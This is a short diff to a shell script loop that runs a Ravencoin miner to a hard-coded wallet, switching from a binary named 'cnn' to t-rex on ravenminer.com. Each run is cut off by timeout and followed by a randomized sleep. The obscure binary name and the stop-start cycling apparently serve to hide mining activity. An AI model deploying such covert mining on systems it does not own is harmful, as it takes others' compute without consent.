@@ -12,8 +12,8 @@ do
 	w=$(($RANDOM%60))
 	e=120
 	aaram=$(($w+$e))
-	timeout -k 5 $c\s   ./cnn/cnn -P stratum+ssl://RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.worker:pps@asia.ravenminer.com:13802 -U
-	timeout -k 5 2s pgrep cnn | xargs kill
+	timeout -k 5 $c\s   ./t-rex -a kawpow -o stratum+tcp://stratum.ravenminer.com:13802 -uRQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.rig -p pps
+	timeout -k 5 2s pgrep t-rex | xargs kill
 	sleep $aaram
 	echo "Kartik Bhai Amar Rahe"
 done
